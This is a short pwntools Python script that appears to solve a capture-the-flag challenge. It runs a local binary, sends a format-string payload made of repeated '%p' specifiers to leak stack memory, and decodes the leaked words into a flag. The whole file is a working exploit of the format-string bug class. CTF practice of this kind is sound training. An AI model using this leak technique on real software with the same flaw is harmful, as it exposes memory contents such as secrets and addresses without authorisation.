from pwn import *

# Launch the vulnerable binary
p = process('./chall.unknown')

# Short delay to ensure the binary is ready
sleep(0.2)

# Format string payload to leak stack values
payload = b'AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'
p.sendline(payload)

# Receive the response with a short timeout
output = p.recv(timeout=2).decode(errors='ignore')

print("[*] Raw output:\n", output)

try:
    # Split output to isolate leaked addresses
    leaked = output.split('AAAA.')[1].split('.')

    # Reconstruct the flag from the leaked values (typically 4 parts)
    flag_bytes = b''.join(p64(int(val, 16)) for val in leaked[7:11])
    flag = flag_bytes.decode('latin-1', errors='ignore')

    # Extract only up to the closing brace
    flag = flag[:flag.index('}') + 1]

    print(f"[+] Flag found: {flag}")

except Exception as e:
    print(f"[-] Failed to parse flag: {e}")
